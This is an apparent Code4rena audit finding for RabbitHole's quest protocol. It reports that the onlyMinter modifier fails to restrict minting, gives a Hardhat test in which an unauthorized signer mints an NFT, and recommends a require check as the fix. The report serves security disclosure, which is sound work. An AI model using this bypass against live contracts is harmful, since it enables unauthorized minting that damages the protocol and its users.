# Original link
https://github.com/code-423n4/2023-01-rabbithole-findings/issues/57
# Lines of code

https://github.com/rabbitholegg/quest-protocol/blob/8c4c1f71221570b14a0479c216583342bd652d8d/contracts/RabbitHoleReceipt.sol#L58-L61
https://github.com/rabbitholegg/quest-protocol/blob/36261511d52dddc757e225324c2c19a3e0a3c3cb/contracts/RabbitHoleTickets.sol#L47-L50


# Vulnerability details

## Impact
```onlyMinter``` modifier in ```RabbitHoleReceipt.sol``` and ```RabbitHoleTickets.sol``` implements wrong ```minterAddress``` check.

[mint](https://github.com/rabbitholegg/quest-protocol/blob/main/contracts/RabbitHoleTickets.sol#L83-L85), [mintBatch](https://github.com/rabbitholegg/quest-protocol/blob/main/contracts/RabbitHoleTickets.sol#L92-L99) and [mint](https://github.com/rabbitholegg/quest-protocol/blob/main/contracts/RabbitHoleTickets.sol#L92-L99) can be called by anyone which breaks protocol's access logic.

## Proof of Concept
Add a new test case in ```test/RabbitHoleReceipt.spec.ts``` file.

```js
it('bypass onlyMinter modifier', async () => {
    const signers = await ethers.getSigners();
    await RHReceipt.setMinterAddress(signers[7].address);

    await RHReceipt.connect(signers[9]).mint(signers[9].address, '1337nft')

    expect(await RHReceipt.balanceOf(signers[9].address)).to.eq(1)
    expect(await RHReceipt.questIdForTokenId(1)).to.eq('1337nft')
})
```

## Tools Used
Hardhat

## Recommended Mitigation Steps
Require function should be added to correctly check the minter's address.

```solidity
modifier onlyMinter() {
    require(msg.sender == minterAddress);
    _;
}
```